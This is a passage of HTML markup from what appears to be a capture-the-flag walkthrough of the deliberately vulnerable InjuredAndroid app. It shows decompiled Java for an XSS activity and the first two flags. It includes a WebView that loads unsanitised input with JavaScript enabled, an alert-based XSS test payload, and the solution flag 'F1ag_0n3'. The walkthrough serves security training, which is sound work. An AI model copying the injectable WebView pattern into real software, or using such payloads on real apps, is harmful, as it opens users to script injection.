class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">content</span><span class=\"p\">.</span><span class=\"nx\">Intent</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">os</span><span class=\"p\">.</span><span class=\"nx\">Bundle</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">view</span><span class=\"p\">.</span><span class=\"nx\">View</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">widget</span><span class=\"p\">.</span><span class=\"nx\">EditText</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">XSSTextActivity</span> <span class=\"kd\">extends</span> <span class=\"nc\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">c</span> <span class=\"p\">{</span>    <span class=\"cm\">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">Bundle</span> <span class=\"nx\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">layout</span><span class=\"p\">.</span><span class=\"nx\">activity_xsstext</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">submitText</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">Intent</span> <span class=\"nx\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">DisplayPostXSS</span><span class=\"p\">.</span><span class=\"kd\">class</span><span class=\"p\">);</span>        <span class=\"nx\">intent</span><span class=\"p\">.</span><span class=\"nf\">putExtra</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">com.b3nac.injuredandroid.DisplayPostXSS</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">((</span><span class=\"nx\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">editText</span><span class=\"p\">)).</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">());</span>        <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"nx\">intent</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">DisplayPostXSS</code> then puts our string into a WebView instance that has JavaScript enabled without any prior sanitation.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">os</span><span class=\"p\">.</span><span class=\"nx\">Bundle</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">webkit</span><span class=\"p\">.</span><span class=\"nx\">WebChromeClient</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">webkit</span><span class=\"p\">.</span><span class=\"nx\">WebSettings</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">webkit</span><span class=\"p\">.</span><span class=\"nx\">WebView</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">DisplayPostXSS</span> <span class=\"kd\">extends</span> <span class=\"nc\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">c</span> <span class=\"p\">{</span>    <span class=\"cm\">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">Bundle</span> <span class=\"nx\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">bundle</span><span class=\"p\">);</span>        <span class=\"nx\">WebView</span> <span class=\"nx\">webView</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">WebView</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"nx\">webView</span><span class=\"p\">);</span>        <span class=\"nb\">String</span> <span class=\"nx\">stringExtra</span> <span class=\"o\">=</span> <span class=\"nf\">getIntent</span><span class=\"p\">().</span><span class=\"nf\">getStringExtra</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">com.b3nac.injuredandroid.DisplayPostXSS</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">WebSettings</span> <span class=\"nx\">settings</span> <span class=\"o\">=</span> <span class=\"nx\">webView</span><span class=\"p\">.</span><span class=\"nf\">getSettings</span><span class=\"p\">();</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">settings</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">vulnWebView.settings</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">settings</span><span class=\"p\">.</span><span class=\"nf\">setJavaScriptEnabled</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>        <span class=\"nx\">webView</span><span class=\"p\">.</span><span class=\"nf\">setWebChromeClient</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nc\">WebChromeClient</span><span class=\"p\">());</span>        <span class=\"nx\">webView</span><span class=\"p\">.</span><span class=\"nf\">loadData</span><span class=\"p\">(</span><span class=\"nx\">stringExtra</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">text/html</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">UTF-8</span><span class=\"dl\">\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">&lt;h1&gt;XSS &lt;script&gt;alert(1)&lt;/script&gt;!&lt;/h1&gt;</code></p><p><img src=\"assets/images/xss2.png\" alt=\"xss2.png\" /></p><h1 id=\"flag-one-login\">Flag One: Login</h1><p>For the first real flag, we can view the conveniently named class <code class=\"language-plaintext highlighter-rouge\">FlagOneLoginActivity</code> from the de-compiled APK.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">FlagOneLoginActivity</span> <span class=\"n\">extends</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span> <span class=\"p\">{</span>    <span class=\"n\">private</span> <span class=\"nb\">int</span> <span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span>    <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">a</span> <span class=\"n\">implements</span> <span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span> <span class=\"p\">{</span>        <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"p\">}</span>        <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span>        <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagOneLoginActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">The flag is right under your nose.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagOneLoginActivity</span> <span class=\"n\">flagOneLoginActivity</span> <span class=\"o\">=</span> <span class=\"n\">FlagOneLoginActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">;</span>                <span class=\"n\">flagOneLoginActivity</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"n\">flagOneLoginActivity</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">);</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagOneLoginActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X2</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">The flag is also under the GUI.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagOneLoginActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"nb\">int</span> <span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"nb\">int</span> <span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">protected</span> <span class=\"o\">*/</span>    <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">activity</span><span class=\"p\">.</span><span class=\"n\">ComponentActivity</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">core</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">e</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">layout</span><span class=\"p\">.</span><span class=\"n\">activity_flag_one_login</span><span class=\"p\">);</span>        <span class=\"n\">j</span><span class=\"p\">.</span><span class=\"n\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"n\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">toolbar</span><span class=\"p\">));</span>        <span class=\"p\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nf\">a</span><span class=\"p\">());</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">submitFlag</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">EditText</span> <span class=\"n\">editText</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">editText2</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">editText</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">editText2</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">editText</span><span class=\"p\">.</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">(),</span> <span class=\"sh\">\"</span><span class=\"s\">F1ag_0n3</span><span class=\"sh\">\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"n\">FlagOneSuccess</span><span class=\"p\">.</span><span class=\"n\">class</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">J</span><span class=\"p\">(</span><span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">flagOneButtonColor</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"n\">intent</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Reviewing the code we find <code class=\"language-plaintext highlighter-rouge\">submitFlag()</code> which compares our user-supplied string to a hard-coded string <code class=\"language-plaintext highlighter-rouge\">F1ag_0n3</code>. If our string matches the hard-coded string then a new intent <code class=\"language-plaintext highlighter-rouge\">FlagOneSuccess</code> will be triggered</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>    <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"k\">void</span> <span class=\"nf\">submitFlag</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">EditText</span> <span class=\"nx\">editText</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">editText2</span><span class=\"p\">);</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">editText</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">editText2</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"nx\">editText</span><span class=\"p\">.</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">(),</span> <span class=\"dl\">\"</span><span class=\"s2\">F1ag_0n3</span><span class=\"dl\">\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"nx\">Intent</span> <span class=\"nx\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">FlagOneSuccess</span><span class=\"p\">.</span><span class=\"kd\">class</span><span class=\"p\">);</span>            <span class=\"k\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">J</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>            <span class=\"k\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">flagOneButtonColor</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>            <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"nx\">intent</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span></code></pre></div></div><h1 id=\"flag-two-exported-activities\">Flag Two: Exported Activities</h1><p>Looking into <code class=\"language-plaintext highlighter-rouge\">FlagTwoActivity</code> we see the hints that we need to use an exported activity.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">os</span><span class=\"p\">.</span><span class=\"nx\">Bundle</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">view</span><span class=\"p\">.</span><span class=\"nx\">View</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">widget</span><span class=\"p\">.</span><span class=\"nx\">Toolbar</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">material</span><span class=\"p\">.</span><span class=\"nx\">floatingactionbutton</span><span class=\"p\">.</span><span class=\"nx\">FloatingActionButton</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">material</span><span class=\"p\">.</span><span class=\"nx\">snackbar</span><span class=\"p\">.</span><span class=\"nx\">Snackbar</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">FlagTwoActivity</span> <span class=\"kd\">extends</span> <span class=\"nc\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">c</span> <span class=\"p\">{</span>    <span class=\"nx\">int</span> <span class=\"nx\">w</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"kr\">public</span> <span class=\"cm\">/* synthetic */</span> <span class=\"k\">void</span> <span class=\"nc\">F</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">int</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">w</span><span class=\"p\">;</span>        <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">i</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nx\">Snackbar</span> <span class=\"nx\">X</span> <span class=\"o\">=</span> <span class=\"nx\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Key words Activity and exported.</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"nx\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Action</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>            <span class=\"nx\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">w</span><span class=\"o\">++</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">i</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nx\">Snackbar</span> <span class=\"nx\">X2</span> <span class=\"o\">=</span> <span class=\"nx\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Exported Activities can be accessed with adb or Drozer.</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"nx\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Action</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>            <span class=\"nx\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">w</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"cm\">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">Bundle</span> <span class=\"nx\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">layout</span><span class=\"p\">.</span><span class=\"nx\">activity_flag_two</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"nx\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">toolbar</span><span class=\"p\">));</span>        <span class=\"p\">((</span><span class=\"nx\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nx\">View</span><span class=\"p\">.</span><span class=\"nc\">OnClickListener</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"c1\">// from class: b3nac.injuredandroid.d</span>            <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// android.view.View.OnClickListener</span>            <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"k\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"nx\">FlagTwoActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">});</span>    <span 